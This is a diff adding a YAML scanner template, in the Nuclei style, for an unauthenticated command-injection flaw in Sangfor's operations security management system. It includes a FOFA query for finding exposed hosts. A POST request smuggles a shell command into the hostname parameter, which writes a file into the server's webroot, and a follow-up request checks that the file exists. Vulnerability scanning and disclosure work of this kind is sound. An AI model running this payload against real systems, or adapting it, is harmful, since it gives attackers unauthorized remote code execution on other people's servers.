@@ -1,0 +1,38 @@
+id: sangfor-osm-session-backtick-injection
+info:
+  name: 深信服运维安全管理系统 session 接口反引号注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: product="SANGFOR-运维安全管理系统"
+    深信服运维安全管理系统（OSM）<3.0.12 20241106 版本中，/protocol/session 接口存在反引号注入缺陷。攻击者利用未充分验证的请求参数，可注入反引号（`）执行任意系统命令，导致未授权远程代码执行。
+  tags: 深信服运维安全管理系统
+
+flow: http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /isomp-protocol/protocol/session HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    Accept: text/plain, */*; q=0.01
+    X-Requested-With: XMLHttpRequest
+    Accept-Encoding: gzip, deflate
+    Connection: keep-alive
+    Access_token: null
+
+    hostname=;echo NdayTest>/usr/local/tomcat/webapps/fort/trust/js/NTest.txt;&port=11&protocol=x11&resolution=1*11&session_path=1&sid=1
+- raw:
+  - |
+    GET /fort/trust/js/NTest.txt HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - NdayTest
